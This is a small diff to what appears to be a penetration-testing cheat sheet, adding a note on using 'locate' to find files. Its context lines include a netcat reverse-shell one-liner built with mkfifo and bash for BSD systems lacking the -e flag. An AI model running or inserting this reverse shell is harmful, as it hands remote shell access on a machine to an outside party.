@@ -76,3 +76,7 @@ Can do a wget or curl
 ## To get a netcat shell in bsd if -e flag is missing
 
 mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ip port > /tmp/f
+
+## To locate a file 
+
+locate <file_name>
